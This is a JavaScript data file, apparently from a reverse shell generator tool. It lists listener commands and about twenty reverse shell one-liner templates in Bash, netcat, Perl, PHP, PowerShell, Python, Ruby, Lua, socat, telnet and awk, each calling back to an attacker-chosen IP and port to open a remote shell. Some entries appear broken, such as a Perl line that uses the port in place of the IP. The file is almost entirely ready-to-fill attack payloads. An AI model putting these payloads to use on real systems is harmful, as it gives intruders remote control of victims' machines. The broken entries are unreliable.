const rsgData = {

    listenerCommands: [
        ['nc', 'nc -lvnp {port}'],
        ['rlwrap + nc', 'rlwrap nc -lvnp {port}'],
        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}']
    ],

    shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],

    reverseShellsCommands: [
        ['Bash #1', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
        ['Bash #2', '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'],
        ['nc #1', 'nc -e /bin/{shell} {ip} {port}'],
        ['nc #2', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/{shell} -i 2>&1|nc {ip} {port} >/tmp/f'],
        ['Lua', 'lua5.1 -e \'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\''],
        ['Perl #1', 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/{shell} -i");};\''],
        ['Perl #2', 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{port}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''],
        ['PHP #1', 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP #2', 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP #3', 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PowerShell #1', 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'],
        ['PowerShell #2', 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'],
        ['PowerShell #3 (Base64)', undefined],
        ['Python #1', 'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/{shell}")\''],
        ['Python #2', 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/{shell}")\''],
        ['Ruby #1', 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/{shell} -i <&%d >&%d 2>&%d",f,f,f)\''],
        ['Ruby #2', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
        ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
        ['telnet', 'mknod a p && telnet {ip} {port} 0&#60;a | /bin/{shell} 1&#62;a'],
        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null']
    ],

    specialCommands: {
        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    }
}


